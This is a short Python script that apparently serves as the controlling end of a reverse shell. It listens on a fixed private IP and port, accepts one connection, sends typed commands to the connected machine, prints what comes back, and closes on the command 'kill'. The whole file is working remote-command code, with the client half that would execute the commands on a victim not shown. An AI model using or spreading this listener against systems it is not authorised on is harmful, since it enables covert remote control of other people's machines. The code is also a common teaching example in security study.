import socket


host = '192.168.35.162'
port = 3333
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sckt:
    sckt.bind((host, port))
    sckt.listen(1)
    con, addr = sckt.accept()
    while True:
        try:
            if bool(con):
                print(f'Connected By {addr}')
                cmd = input('$> ')
                if cmd != 'kill':
                    con.sendall(bytes(cmd.encode('utf-8')))

                    msg = con.recv(1024)
                    print(msg.decode('utf-8'))
                else:
                    con.sendall(bytes(cmd.encode('utf-8')))
                    
                    msg = con.recv(1024)
                    print(msg.decode('utf-8'))
                    con.close()
                    break
        except Exception as ex:
            print('ERROR !')
            print(ex)

        